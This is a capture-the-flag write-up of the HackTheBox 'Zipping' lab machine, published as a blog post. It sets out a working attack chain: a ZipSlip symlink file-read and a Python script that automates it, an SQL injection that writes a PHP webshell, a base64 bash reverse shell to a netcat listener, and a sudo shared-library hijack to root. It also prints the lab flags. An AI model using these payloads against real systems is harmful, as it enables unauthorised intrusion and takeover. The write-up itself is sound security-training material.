---
title: "Zipping"
description: "My first Medium difficulty box writeup, this one really took some time..."
pubDate: 2024-01-04
author: "sealldev"
section: "HackTheBox"
image: "images/htb/box/zipping/icon.png"
tags: ["medium", "hackthebox-machine"]
---

**Machine created by:** [xdann1](https://app.hackthebox.com/users/535069)

## Recon

Starting with a nmap scan of the IP, we see 3 open ports.

```
$ sudo nmap 10.10.11.229 --top-ports 1000
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-03 18:15 AEDT
Nmap scan report for 10.10.11.229
Host is up (0.062s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Add a new entry to the `/etc/hosts` file.

```
10.10.11.229 zipping.htb
```

Visiting the webpage at [zipping.htb](http://zipping.htb:80) is a typical landing page.

![Main Page](images/htb/box/zipping/main.png)

Looking around the page I find an upload page for a zipped PDF.

![Upload Page](images/htb/box/zipping/upload.png)

## Exploitation & User Flag

I attempted some basic attacks like using unicode to force a PHP extension. After noticing an update in the HackTheBox updates page stating a patch for an unintended nullbyte vulnerability, I stopped pursuing these attacks.

I then remembered there were some zip vulnerabilities that involved symlinks, specifically ZipSlip.

I create a symlink and zip it to read the `/etc/passwd` file.

```
$ ln -s ../../../../../../../../../../etc/passwd zipslip.pdf
$ zip -y zipslip.zip zipslip.pdf
  adding: zipslip.pdf (deflated 70%)
```

Uploading the zip and looking at the response gives us the base64 encoded data of the `/etc/passwd` file.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```

We can see a user `rektsu` and probably get the user flag doing this!

```
$ ln -s ../../../../../../../../../../home/rektsu/user.txt zipslip-user.pdf
$ zip -y zipslip-user.zip zipslip-user.pdf
```

And surely enough after upload, visiting the URL and base64 decoding the response, we get our user flag! 

Flag: `7fc124f67ec9ba3c47da4afb6e7a77ee`

## Inital Access & Exploitation+

To make the process a bit quicker I ended up writing a python script to automatically perform the ZipSlip attack:

```python
import os, requests, sys

try:
    print('Made by sealldeveloper')
    path_trav="../../../../../../../../../../../../../../../../../../.."
    path=path_trav+sys.argv[1]
except:
    print(f'ERROR: Please provide a file path! eg. python3 {sys.argv[0]} /etc/passwd')
    sys.exit()

print('Making symlink...')
os.system(f'ln -s {path} zipslip.pdf')
print('Making zip...')
os.system(f'zip -y zipslip.zip zipslip.pdf')
print('Removing symlink...')
os.system('rm zipslip.pdf')
print('Crafting payload for uploader...')

data = {
    "submit": ""
}
url='http://zipping.htb/upload.php'
files={'zipFile':('zipslip.zip', open('zipslip.zip','rb'),'application/zip')}
print('Sending payload!')
r = requests.post(url, files=files, data=data, verify=False)
try:
    uploadedurl=r.text.split('following path:</p><a href="')[1].split('">')[0]
    url='http://zipping.htb/'+uploadedurl
except:
    print('No upload url found!')

if 'uploads' in url:
    r=requests.get(url, verify=False)
    print('Writing to \'out.txt\'...')
    with open('out.txt','w') as f:
        f.write(r.text)
print('Cleaning up...')
os.system('rm zipslip.zip')
```

Now I can demo the exploit as so:

```
$ python3 zislip-exploiter.py
Made by sealldeveloper
Making symlink...
Making zip...
  adding: zipslip.pdf (stored 0%)
Removing symlink...
Crafting payload for uploader...
Sending payload!
Writing to 'out.txt'...
Cleaning up...
```

and the file data is written to `out.txt` in the same folder!

After a few attempts I found the following file path for the website: `/var/www/html/` and one specific file of interest.

Reading `/var/www/html/shop/cart.php` has a vulnerability.

```php
// If the user clicked the add to cart button on the product page we can check for the form data
if (isset($_POST['product_id'], $_POST['quantity'])) {
    // Set the post variables so we easily identify them, also make sure they are integer
    $product_id = $_POST['product_id'];
    $quantity = $_POST['quantity'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $product_id, $match) || preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match)) {
        echo '';
    } else {
        // Construct the SQL statement with a vulnerable parameter
        $sql = "SELECT * FROM products WHERE id = '" . $_POST['product_id'] . "'";
        // Execute the SQL statement without any sanitization or parameter binding
        $product = $pdo->query($sql)->fetch(PDO::FETCH_ASSOC);
```

The data of `/var/www/html/shop/index.php` where we specify the `page` has no restriction against direct paths aswell, but only for `.php` files.

```php
<?php
session_start();
// Include functions and connect to the database using PDO MySQL
include 'functions.php';
$pdo = pdo_connect_mysql();
// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
// Include and show the requested page
include $page . '.php';
?>
```

Using the SQLi with a CRLF we can print data to an outfile, then read it with a direct path.

```
POST /shop/index.php?page=cart HTTP/1.1
...

quantity=1&product_id=%0a';select+@@version+into+outfile+'<directory>'; --1
```

Let's find a way to output a file, we can't write to:

```
/tmp/version.txt
/var/www/html/version.txt
/var/www/html/shop/version.txt
```

Could we write to a library? As the queries are typically run by the `mysqld` user. Let's try write to `/var/lib/mysql/`...

```
POST /shop/index.php?page=cart HTTP/1.1
...

quantity=1&product_id=%0a';select+@@version+into+outfile+'/var/lib/mysql/version.txt'; --1
```

Using our previous script, we get an output reading `/var/lib/mysql/version.txt` with the script!

`10.6.12-MariaDB-0ubuntu0.22.10.1`

Let's use some Base64 to make a PHP webshell, using a [tiny GET webshell](https://github.com/bayufedra/Tiny-PHP-Webshell#simple-http-requests-get-method-shell).

```
POST /shop/index.php?page=cart HTTP/1.1
...

quantity=1&product_id=%0a';select+from_base64('PD89YCRfR0VUWzBdYD8%2b')+into+outfile+'/var/lib/mysql/webshell.php'; --1
```

So we can use [zipping.htb/shop/index.php?page=/var/lib/mysql/webshell](http://zipping.htb:80/shop/index.php?page=/var/lib/mysql/webshell) to visit our webshell, and use the `0` param to send commands!

Visiting [zipping.htb/shop/index.php?page=/var/lib/mysql/webshell&0=whoami](http://zipping.htb:80/shop/index.php?page=/var/lib/mysql/webshell&0=whoami) gives us `rektsu`!

Now, I had a bit of trouble getting a reverse shell with the webshell so I ended up doing it like this:

I setup a listener on my host:

```
$ nc -lvnp 4445
```

I get a bash reverse shell from RevShells and base64 encoded it. I then run all the commands in order on the server.

```
echo "<b64 encoded bash reverse shell>" | base64 -d > /home/rektsu/revshell.sh
chmod +x /home/rektsu/revshell.sh
bash /home/rektsu/revshell.sh
```

and I got my reverse shell!

```
Connection from 10.10.11.229:36792
bash: cannot set terminal process group (1134): Inappropriate ioctl for device
bash: no job control in this shell
rektsu@zipping:/var/www/html/shop$
```

## Root Flag

Looking at the `sudo -l` we are given an entry:

```
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

Executing the binary prompts a password.

```
$ sudo /usr/bin/stock
Enter the password:
```
Running `strings /usr/bin/stock` lists the strings in the binary, and there is a particular one of interest:

`St0ckM4nager`

Using this as the password works successfully!

```
$ sudo /usr/bin/stock
Enter the password: St0ckM4nager

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option:
```

Looking through the options we can view the stock file, edit the stock entries, and exit the program.

None of the options seem to have any capabilities, so lets run `strace /usr/bin/stock` to look at what the binary is calling.

After entering the password an entry of interest is seen:

`openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)`

Its referencing a file that doesn't exist, we could abuse this with sudo for a shell! I used the C shell file from [here](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics#sudo-ld_preload).

```
$ gcc -fPIC -shared -o libcounter.so libcounter.c -nostartfiles
$ mv libcounter.so /home/rektsu/.config/
```

Running `sudo /usr/bin/stock` then entering the password gives us a root shell!

```
(remote) rektsu@zipping:/tmp$ sudo /usr/bin/stock
Enter the password: St0ckM4nager
root@zipping:/tmp# cat /root/root.txt
107cbf13ead882d8c94a466997b45138
```

Giving us our root flag! 

Flag: `107cbf13ead882d8c94a466997b45138`

Success!

![Success](images/htb/box/zipping/submitted.png)